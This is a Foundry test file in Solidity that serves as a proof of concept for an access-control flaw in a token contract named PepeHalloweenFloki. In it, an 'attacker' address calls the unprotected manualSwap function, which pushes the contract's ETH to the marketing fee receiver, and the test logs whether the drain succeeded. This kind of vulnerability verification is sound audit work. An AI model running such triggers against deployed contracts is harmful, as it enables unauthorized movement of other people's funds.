// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/PepeHalloweenFloki.sol";

contract PepeHalloweenFlokiTest is Test {
    PepeHalloweenFloki internal token;
    address internal owner = makeAddr("owner");
    address internal attacker = makeAddr("attacker");
    address internal marketingFeeReceiver = address(0x6249e32618B38Bc5b1B4e5842949FBDafE4fCDcB);
    
    // Mock addresses for Uniswap components
    address constant ROUTER_ADDRESS = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address constant MOCK_WETH = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address constant MOCK_FACTORY = address(0x1111111111111111111111111111111111111111);
    address constant MOCK_PAIR = address(0x2222222222222222222222222222222222222222);

    function setUp() public {
        // Setup mock calls for router and factory
        vm.mockCall(
            ROUTER_ADDRESS,
            abi.encodeWithSignature("WETH()"),
            abi.encode(MOCK_WETH)
        );
        vm.mockCall(
            ROUTER_ADDRESS,
            abi.encodeWithSignature("factory()"),
            abi.encode(MOCK_FACTORY)
        );
        vm.mockCall(
            MOCK_FACTORY,
            abi.encodeWithSignature("createPair(address,address)"),
            abi.encode(MOCK_PAIR)
        );

        vm.startPrank(owner);
        token = new PepeHalloweenFloki();
        
        // Fund token contract with 1 ether
        vm.deal(address(token), 1 ether);
        vm.stopPrank();
    }

    function test_manualSwapVulnerability() public {
        console2.log("--- BEFORE-Trigger State ---");
        uint256 initialContractBalance = address(token).balance;
        uint256 initialReceiverBalance = marketingFeeReceiver.balance;
        console2.log("Contract balance (before):", initialContractBalance);
        console2.log("Marketing fee receiver balance (before):", initialReceiverBalance);

        console2.log("--- Trigger Action: Attacker calls manualSwap ---");
        // Attacker calls the unprotected function
        vm.prank(attacker);
        token.manualSwap();

        console2.log("--- AFTER-Trigger State ---");
        uint256 contractBalanceAfter = address(token).balance;
        uint256 receiverBalanceAfter = marketingFeeReceiver.balance;
        console2.log("Contract balance (after):", contractBalanceAfter);
        console2.log("Marketing fee receiver balance (after):", receiverBalanceAfter);

        // Calculate state differences
        uint256 contractBalanceDecrease = initialContractBalance - contractBalanceAfter;
        uint256 receiverBalanceIncrease = receiverBalanceAfter - initialReceiverBalance;

        console2.log("Contract balance decrease:", contractBalanceDecrease);
        console2.log("Receiver balance increase:", receiverBalanceIncrease);

        // Verify state changes
        bool contractDrained = contractBalanceAfter == 0;
        bool receiverFunded = receiverBalanceIncrease == initialContractBalance;
        bool vulnerabilityExploited = contractDrained && receiverFunded;

        if (vulnerabilityExploited) {
            console2.log("Vulnerability exists: Contract ETH drained to marketing receiver without authorization");
        } else {
            console2.log("Vulnerability not exist: No unauthorized ETH transfer occurred");
        }

        // Final verdict determination
        if (vulnerabilityExploited) {
            console2.log("Vulnerability Exists: Attacker successfully drained contract balance to marketing fee receiver without authorization");
        } else {
            console2.log("Vulnerability not Exist: Contract balance was not drained or marketing receiver didn't receive funds");
        }
    }
}